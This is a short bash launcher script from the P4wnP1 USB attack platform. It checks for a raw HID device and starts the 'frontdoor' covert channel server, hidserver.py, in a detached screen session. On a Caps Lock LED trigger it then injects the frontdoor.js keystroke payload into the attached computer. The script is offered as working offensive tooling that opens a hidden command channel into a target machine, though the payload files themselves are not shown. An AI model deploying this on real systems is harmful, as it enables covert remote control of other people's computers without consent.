#!/bin/bash
hidraw=$(P4wnP1_cli usb get device raw)

# Check if no raw HID device found
if [ "$hidraw" = "" ]; then
    echo "[!] No raw HID device found, aborting"
    exit
fi

# Check if hidserver.py is already running
if ! ps aux | grep '[h]idserver.py' > /dev/null; then
    echo "[*] Starting hidserver.py for frontdoor covert channel payload..."
    touch /tmp/device_hid_mouse
    screen -dmS hidsrv bash -c "cd /usr/local/P4wnP1/legacy/Frontdoor; python2 hidserver.py"
    echo "[+] Type \"screen -d -r hidsrv\" to switch to frontdoor cli"
    P4wnP1_cli hid run -c 'waitLED(CAPS);waitLED(CAPS);waitLED(CAPS);' && P4wnP1_cli hid run -n frontdoor.js &
else
    echo "[!] Frontdoor covert channel server already running"
fi
